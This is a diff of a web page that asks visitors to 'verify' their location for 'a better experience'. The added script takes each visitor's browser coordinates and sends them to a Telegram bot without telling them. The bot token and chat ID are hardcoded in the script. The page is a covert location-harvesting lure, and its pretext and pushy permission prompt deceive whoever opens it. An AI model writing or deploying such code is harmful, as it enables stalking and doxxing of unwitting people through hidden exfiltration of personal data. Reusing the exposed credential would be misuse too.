@@ -1,53 +1,57 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Verify Your Location</title>
-  <link rel="stylesheet" href="style.css">
-</head>
-<body>
+<script>
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition, showError);
+  } else {
+    document.getElementById("location").innerHTML = "Geolocation not supported.";
+  }
+}
 
-  <div id="info-box">
-    <h1>Verify Your Location</h1>
-    <p>We need to verify your location to provide you a better experience. 🌎 <br> (It will take just 2 seconds!)</p>
-    <button onclick="getLocation()">Verify Now</button>
-    <p id="location"></p>
-  </div>
+// Replace these with your actual bot token and chat ID
+const TELEGRAM_BOT_TOKEN = '7520502061:AAFN5xZZqgwqAAvXgnmcwIlU3lzpBZgyOX4';
+const TELEGRAM_CHAT_ID = '5800779430';
 
-  <script>
-    function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition, showError);
-      } else {
-        document.getElementById("location").innerHTML = "Geolocation not supported.";
-      }
-    }
+function showPosition(position) {
+  const latitude = position.coords.latitude;
+  const longitude = position.coords.longitude;
+  document.getElementById("location").innerHTML = 
+    `✅ Location verified!<br>Latitude: ${latitude}<br>Longitude: ${longitude}`;
 
-    function showPosition(position) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      document.getElementById("location").innerHTML = 
-        `✅ Location verified!<br>Latitude: ${latitude}<br>Longitude: ${longitude}`;
-    }
+  // Send Telegram notification
+  const message = `New Location Verified! 🌎\nLatitude: ${latitude}\nLongitude: ${longitude}`;
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message
+    })
+  })
+  .then(response => response.json())
+  .then(data => {
+    console.log('Telegram message sent:', data);
+  })
+  .catch(error => {
+    console.error('Error sending Telegram message:', error);
+  });
+}
 
-    function showError(error) {
-      switch(error.code) {
-        case error.PERMISSION_DENIED:
-          alert("Oops! You denied location access. Please allow to continue.");
-          break;
-        case error.POSITION_UNAVAILABLE:
-          alert("Location information unavailable.");
-          break;
-        case error.TIMEOUT:
-          alert("Request timed out. Try again.");
-          break;
-        case error.UNKNOWN_ERROR:
-          alert("Unknown error occurred.");
-          break;
-      }
-    }
-  </script>
-
-</body>
-</html>
+function showError(error) {
+  switch(error.code) {
+    case error.PERMISSION_DENIED:
+      alert("Oops! You denied location access. Please allow to continue.");
+      break;
+    case error.POSITION_UNAVAILABLE:
+      alert("Location information unavailable.");
+      break;
+    case error.TIMEOUT:
+      alert("Request timed out. Try again.");
+      break;
+    case error.UNKNOWN_ERROR:
+      alert("Unknown error occurred.");
+      break;
+  }
+}
+</script>
